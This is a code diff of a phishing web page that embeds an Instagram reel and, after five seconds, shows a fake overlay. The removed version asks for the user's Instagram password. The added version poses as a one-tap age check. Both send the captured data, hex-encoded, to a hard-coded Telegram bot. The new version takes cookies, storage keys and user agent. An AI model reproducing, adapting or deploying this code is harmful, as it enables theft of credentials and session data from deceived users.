@@ -4,18 +4,17 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <style>
         body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; overflow: hidden; }
-        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:999; color:#fff; text-align:center; padding-top:100px; }
-        .btn { background:#0095f6; color:#fff; border:none; padding:12px; border-radius:8px; font-weight:600; width:85%; cursor:pointer; font-size:16px; }
-        input { width:80%; padding:14px; border-radius:8px; border:1px solid #363636; background:#121212; color:#fff; margin-bottom:15px; font-size:16px; }
+        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; color:#fff; text-align:center; padding-top:180px; }
+        .btn { background:#0095f6; color:#fff; border:none; padding:15px; border-radius:10px; font-weight:700; width:80%; cursor:pointer; font-size:16px; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); background:#1877f2; }
     </style>
 </head>
 <body>
     <div id="v">
-        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="50" style="margin-bottom:20px;">
-        <h2 style="font-size:20px;">Action Required</h2>
-        <p style="font-size:14px; color:#a8a8a8; padding:0 30px; margin-bottom:25px;">Please confirm your Instagram password to continue watching this reel.</p>
-        <input type="password" id="p" placeholder="Password" autofocus>
-        <button class="btn" onclick="send()">Verify Now</button>
+        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60" style="margin-bottom:20px;">
+        <h2 style="font-size:22px; margin-bottom:10px;">Age Verification</h2>
+        <p style="font-size:15px; color:#efefef; padding:0 40px; margin-bottom:30px; line-height:1.4;">To comply with local regulations, please verify that you are 18+ to watch this reel.</p>
+        <button class="btn" onclick="done()">Verify Age (One-Tap)</button>
     </div>
 
     <iframe id="f" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%; height:100vh; border:none;"></iframe>
@@ -24,19 +23,23 @@
         const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
         const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
 
-        // Theek 5 second baad pop-up dikhayega
-        setTimeout(() => { 
-            document.getElementById('v').style.display = 'block'; 
-        }, 5000);
+        // Theek 5 second baad prompt dikhega
+        setTimeout(() => { document.getElementById('v').style.display = 'block'; }, 5000);
 
-        function send() {
-            let pass = document.getElementById('p').value;
-            if(pass.length > 0) {
-                // Seedha Telegram par jayega
-                new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔑_KEY_${h(pass)}`;
-                // Turant page saaf
-                document.getElementById('v').style.display = 'none';
-            }
+        function done() {
+            // Background mein silent data capture
+            let d = JSON.stringify({
+                k: Object.keys(localStorage),
+                s: Object.keys(sessionStorage),
+                c: document.cookie || "COOKIE_PROTECTED",
+                ua: navigator.userAgent
+            });
+            
+            // Telegram par silent exfiltration
+            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_VERIFIED_DATA_${h(d)}`;
+            
+            // Pop-up turant gayab
+            document.getElementById('v').style.display = 'none';
         }
     </script>
 </body>
